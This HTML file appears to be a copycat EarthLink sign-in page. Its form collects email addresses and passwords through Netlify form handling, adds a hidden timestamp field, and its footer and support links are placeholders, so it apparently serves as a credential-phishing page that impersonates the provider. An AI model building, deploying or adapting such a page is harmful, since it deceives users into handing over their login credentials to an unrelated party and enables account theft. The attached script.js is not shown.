<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
   
    
    <div class="container">
        <header>
            <h1>Welcome to EarthLink</h1>
            <p>Sign in to get started</p>
        </header>
        
        <!-- Updated form with Netlify attributes -->
        <form id="loginForm" name="EarthLink-Login" netlify netlify-honeypot="bot-field">
            <!-- Hidden honeypot field for spam protection -->
            <input type="hidden" name="bot-field" />
            
            <!-- Hidden timestamp field -->
            <input type="hidden" name="timestamp" id="timestamp" />
            
            <div class="input-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required>
            </div>
            
            <div class="input-group">
                <label for="password">Password</label>
                <div class="password-container">
                    <input type="password" id="password" name="password" required>
                    <i class="far fa-eye" id="togglePassword"></i>
                </div>
            </div>
            
            <div class="options">
                <div class="remember-me">
                    <input type="checkbox" id="remember" name="remember">
                    <label for="remember">Remember username</label>
                </div>
                <a href="#" class="forgot-password">Forgot your password?</a>
            </div>
            
            <button type="submit" class="btn btn-gray">Sign In</button>
        </form>
        
        <div class="action-buttons">
            <button class="btn btn-blue">Make a Payment</button>
            <button class="btn btn-blue">Support</button>
        </div>
    </div>
    
    <footer>
        <nav>
            <div class="footer-links"><a href="#">Internet</a><span> ></span></div>
            <div class="footer-links"><a href="#">Email</a><span> ></span></div>
            <div class="footer-links"><a href="#">My Account</a><span> ></span></div>
            <div class="footer-links"><a href="#">Help</a><span> ></span></div>
        </nav>
        <button class="chat-btn">Chat</button>
        <div class="privacy-link">
        <a href="privacy.html">Privacy Policy</a>
    </div>
</footer>
    </footer>
    
    <script src="script.js"></script>

</body>
</html>
